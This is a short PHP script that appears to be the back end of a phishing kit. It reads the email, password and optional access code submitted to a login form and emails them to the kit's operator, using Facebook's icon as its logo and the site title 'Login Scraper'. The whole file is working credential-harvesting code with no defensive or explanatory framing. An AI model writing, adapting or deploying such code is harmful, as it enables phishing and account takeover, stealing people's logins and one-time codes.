<?php
// Include your mailer configuration file
require '../vendor/mailer.php'; // Ensure this is properly configured

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get form data
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $code = isset($_POST['code']) ? $_POST['code'] : ''; // If access code is submitted

    // Email subject and message
    $subject = 'New Login Details';
    $message = "
        <p><strong>Email:</strong> $email</p>
        <p><strong>Password:</strong> $password</p>
    ";

    // If the access code is also included, add it to the message
    if (!empty($code)) {
        $message .= "<p><strong>Access Code:</strong> $code</p>";
    }

    // Path to site logo and site title for the email
    $site_logo_path = 'https://www.facebook.com/images/fb_icon_325x325.png'; // Update with the actual path to your site logo
    $site_title = 'Login Scraper'; // Update with your site title

    // Send the email using your pre-configured sendEmail function
    $emailSent = sendEmail($subject, $email, $message, $site_logo_path, $site_title);

    // Check if the email was sent successfully
    if ($emailSent) {
        echo 'success'; // Optional response for AJAX handling
    } else {
        echo 'Failed to send email'; // Handle error scenario
    }
}
?>
